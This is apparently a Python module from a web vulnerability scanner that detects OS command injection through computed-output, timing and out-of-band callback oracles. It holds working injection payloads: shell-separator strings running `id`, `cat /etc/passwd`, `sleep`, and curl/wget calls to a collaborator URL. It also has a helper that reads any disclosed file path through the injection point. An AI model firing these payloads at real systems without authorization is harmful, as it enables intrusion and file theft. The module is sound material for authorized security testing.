"""
OS command-injection detection — computed-output, time, and OOB oracles.

A native complement to the shell-injection templates in nuclei. Three confirmed
signals, none of them destructive:

  1. Computed output: inject `echo cmi$((A*B))` across separators (; | & `` $()
     newline). The response is a hit only when it contains the PRODUCT (e.g.
     cmi260599) — which is NOT present in the payload, so an app that merely
     echoes the injected string back cannot false-positive; only real execution
     computes it. Also detects `id` / passwd output.

  2. Time-based blind: `; sleep N` (and Windows `ping -n`) with a `sleep 0`
     control; confirmed only when the delayed request is slower than the control
     by ~N seconds (rules out jitter).

  3. OOB: a `curl`/`wget` to the native collaborator confirms blind command
     execution via the server-side callback (reuses collaborator.py).

Pure/deterministic and unit-tested; tools._run_cmdi does the transport + timing.
"""
from __future__ import annotations

import re

MARKER = "cmi"
_A, _B = 421, 619
EXPECTED = f"{MARKER}{_A * _B}"          # cmi260599 — appears only if the echo executed

_OUTPUT_SIGS = [
    re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+"),      # id
    re.compile(r"root:.*?:0:0:", re.M),             # /etc/passwd
]


def output_payloads(value: str) -> list:
    v = value or ""
    calc = f"{MARKER}$(( {_A} * {_B} ))"
    return [
        {"payload": f"{v}; echo {calc}"},
        {"payload": f"{v} | echo {calc}"},
        {"payload": f"{v}& echo {calc}"},
        {"payload": f"{v}`echo {calc}`"},
        {"payload": f"{v}$(echo {calc})"},
        {"payload": f"{v}%0aecho {calc}"},
        {"payload": f"{v}; id"},
    ]


# ── ARGV-SINK SHAPE: replace the value, do not append to it ──────
# Every payload above APPENDS to the observed value, which assumes the value lands inside a string a
# shell will parse. That assumption is wrong for the other common OS-command sink:
#
#     Runtime.exec(String)  /  execve(argv)   -- the string is tokenised and run as argv DIRECTLY
#
# There is no shell, so `;` `|` `&&` are ordinary argv words and NO metacharacter payload can execute
# — and appending to the observed value merely adds junk arguments to a command that still runs the
# app's own program. The shape that works there replaces the value with a bare command, so the value
# IS the command line.
#
# The proof is the command's own output. `uid=0(root) gid=0(root)` is not present in the payload `id`,
# exactly as the computed product is not present in the echo payloads, so an endpoint that merely
# reflects the payload still cannot satisfy `analyze_output`. That property is what makes the shape
# safe to ship, and `tests/test_cmdi_shapes.py` asserts it for every payload.
#
# Read-only commands only: this proves execution, it never changes state.
_ARGV_CMDS = ["id", "cat /etc/passwd"]


def argv_payloads(value: str = "") -> list:
    """Bare commands for an ARGV sink. `value` is accepted and deliberately UNUSED — the shape is
    defined by replacing it, and taking the argument keeps the call sites symmetrical with
    `output_payloads(value)` so neither is mistaken for the other."""
    return [{"payload": c, "shape": "argv"} for c in _ARGV_CMDS]


def argv_time_payloads(seconds: int) -> list:
    """Blind/time-based for an argv sink: the delay IS the whole command.

    The control is the same command with the delay removed, so a confirmation requires a differential
    the trigger itself caused — an endpoint that is simply slow for every input produces
    control ~= probe and `analyze_time` declines it."""
    s = max(1, int(seconds))
    return [
        {"payload": f"sleep {s}", "control": "sleep 0", "shape": "argv"},
        {"payload": f"ping -c {s + 1} 127.0.0.1", "control": "ping -c 1 127.0.0.1", "shape": "argv"},
    ]


def argv_oob_payloads(collab_url: str) -> list:
    """Out-of-band for an argv sink: the fetch IS the whole command, no separator.

    A callback that never arrives is a NON-DETECTION. Nothing here may be reported on a timeout."""
    u = (collab_url or "").strip()
    if not u:
        return []
    return [f"curl -s {u}", f"wget -q -O- {u}"]


def read_file_payloads(value: str, path: str) -> list:
    """Payloads that READ a specific disclosed file through the injection point. Pure.

    `output_payloads` proves execution; this is the ordinary step after — a target that discloses an
    absolute path (in a hint, a stack trace, an error page) and also executes injected commands has
    handed over both halves. The separator shapes mirror `output_payloads` so anything that works there
    works here.

    A trailing comment terminator is included because the injection point is usually mid-command and the
    remainder would otherwise be a syntax error that discards the whole line — the injection succeeds and
    returns nothing, which is indistinguishable from not being injectable."""
    v, p = value or "", (path or "").strip()
    if not p:
        return []
    return [
        {"payload": "%s; cat %s #" % (v, p)},
        {"payload": "%s | cat %s" % (v, p)},
        {"payload": "%s$(cat %s)" % (v, p)},
        {"payload": "%s`cat %s`" % (v, p)},
        {"payload": "%s%%0acat %s" % (v, p)},
    ]


def analyze_output(baseline: str, probe: str) -> dict | None:
    """Hit only on evidence of execution (the computed product or id/passwd),
    never on the echoed payload — EXPECTED is absent from every payload above."""
    base, body = baseline or "", probe or ""
    if EXPECTED in body and EXPECTED not in base:
        return {"kind": "computed-echo", "match": EXPECTED}
    for rx in _OUTPUT_SIGS:
        m = rx.search(body)
        if m and not rx.search(base):
            return {"kind": "command-output", "match": m.group(0)[:60]}
    return None


def time_payloads(value: str, seconds: int) -> list:
    v = value or ""
    return [
        {"payload": f"{v}; sleep {seconds}", "control": f"{v}; sleep 0"},
        {"payload": f"{v}| sleep {seconds}", "control": f"{v}| sleep 0"},
        {"payload": f"{v}& sleep {seconds}", "control": f"{v}& sleep 0"},
        {"payload": f"{v}`sleep {seconds}`", "control": f"{v}`sleep 0`"},
        {"payload": f"{v}$(sleep {seconds})", "control": f"{v}$(sleep 0)"},
        {"payload": f"{v}%0asleep {seconds}", "control": f"{v}%0asleep 0"},
        {"payload": f"{v}& ping -n {seconds + 1} 127.0.0.1", "control": f"{v}& ping -n 1 127.0.0.1"},
    ]


def analyze_time(control_elapsed: float, sleep_elapsed: float, seconds: int, margin: float = 0.6) -> bool:
    need = seconds * margin
    return sleep_elapsed - control_elapsed >= need and sleep_elapsed >= need


def oob_payloads(value: str, collab_url: str) -> list:
    v = value or ""
    return [
        f"{v}; curl -s {collab_url}",
        f"{v}| curl -s {collab_url}",
        f"{v}`curl -s {collab_url}`",
        f"{v}$(curl -s {collab_url})",
        f"{v}; wget -q -O- {collab_url}",
    ]


# ── finding builders ─────────────────────────────────────────────
def _base(url: str, param: str, oracle: str, sev: str, desc: str, evidence: str, steps: list) -> dict:
    return {
        "title": f"OS command injection ({oracle}) in '{param}'", "param": param,  # Q-046
        "severity": sev, "target": url,
        "description": desc,
        "impact": "Execute arbitrary OS commands on the server: full host compromise, data theft, lateral movement.",
        "reproduction_steps": steps, "evidence": evidence, "cwe": "CWE-78",
        "family": "cmdi", "tags": ["cmdi", "rce", oracle], "confidence": "confirmed",
    }


def output_finding(url: str, param: str, payload: str, hit: dict) -> dict:
    return _base(url, param, "output", "critical",
                 (f"Injecting {payload!r} into '{param}' produced command output ({hit['kind']}: {hit['match']}) that "
                  "the injected string itself does not contain — the OS command executed."),
                 f"{hit['kind']}: {hit['match']}",
                 [f"Set '{param}' to {payload!r}",
                  f"Observe the executed-command output ({hit['match']}) in the response",
                  "Escalate to a reverse shell only under explicit authorization"])


def argv_output_finding(url: str, param: str, payload: str, hit: dict) -> dict:
    f = _base(url, param, "argv", "critical",
              (f"Setting '{param}' to the bare command {payload!r} — replacing the value rather than "
               f"appending to it — returned that command's own output ({hit['kind']}: {hit['match']}). "
               "The value is passed to the process launcher as the command line itself, so it is run "
               "as argv with no shell involved; that is why separator payloads produce nothing here."),
              f"{hit['kind']}: {hit['match']}",
              [f"Set '{param}' to {payload!r} (replace the whole value)",
               f"Observe the executed-command output ({hit['match']}) in the response",
               "Escalate to a reverse shell only under explicit authorization"])
    f["tags"] = ["cmdi", "rce", "argv", "argv-sink"]
    return f


def argv_time_finding(url: str, param: str, item: dict, control_elapsed: float,
                      sleep_elapsed: float, seconds: int) -> dict:
    f = _base(url, param, "argv-time-blind", "critical",
              (f"For '{param}', the bare command {item['payload']!r} delayed the response to "
               f"{sleep_elapsed:.1f}s against {control_elapsed:.1f}s for {item['control']!r} — the same "
               f"command with the delay removed. Nothing is reflected, so this is blind command "
               f"execution through an argv sink, proven by the trigger-removed differential."),
              f"{sleep_elapsed:.1f}s vs control {control_elapsed:.1f}s (injected {seconds}s)",
              [f"Set '{param}' to {item['payload']!r}",
               f"Observe the response takes ~{seconds}s longer than {item['control']!r}",
               "Confirm with an OOB payload or an output-based command"])
    f["tags"] = ["cmdi", "rce", "argv", "blind", "time"]
    return f


def argv_oob_finding(url: str, param: str, probe: str, interactions: list) -> dict:
    src = (interactions[0] if interactions else {}).get("source_ip", "?")
    f = _base(url, param, "argv-oob", "critical",
              (f"Setting '{param}' to the bare command {probe!r} triggered a server-side request from "
               f"{src}. Nothing was reflected, so this is blind command execution through an argv "
               "sink, proven by the callback."),
              f"OOB interaction from {src} on {probe}",
              [f"Set '{param}' to a bare curl/wget of {probe}",
               f"Observe the inbound interaction at the collaborator from {src}",
               "Escalate to full command execution only under explicit authorization"])
    f["tags"] = ["cmdi", "rce", "argv", "blind", "oob"]
    return f


def time_finding(url: str, param: str, item: dict, control_elapsed: float, sleep_elapsed: float, seconds: int) -> dict:
    return _base(url, param, "time-blind", "critical",
                 (f"For '{param}', {item['payload']!r} delayed the response to {sleep_elapsed:.1f}s vs "
                  f"{control_elapsed:.1f}s for the sleep-0 control (~{seconds}s injected). A shell command executed "
                  "(blind command injection)."),
                 f"{sleep_elapsed:.1f}s vs control {control_elapsed:.1f}s (injected {seconds}s)",
                 [f"Set '{param}' to {item['payload']!r}",
                  f"Observe the response takes ~{seconds}s longer than the sleep-0 control",
                  "Confirm with an OOB payload or output-based command"])


def oob_finding(url: str, param: str, probe: str, interactions: list) -> dict:
    src = (interactions[0] if interactions else {}).get("source_ip", "?")
    return _base(url, param, "oob", "critical",
                 (f"An injected `curl`/`wget` to the collaborator ({probe}) triggered a server-side request from "
                  f"{src}. Nothing was reflected, so this is blind command injection proven by the callback."),
                 f"OOB interaction from {src} on {probe}",
                 [f"Set '{param}' to a payload running curl {probe}",
                  f"Observe the inbound interaction at the collaborator from {src}",
                  "Escalate to full command execution only under explicit authorization"])
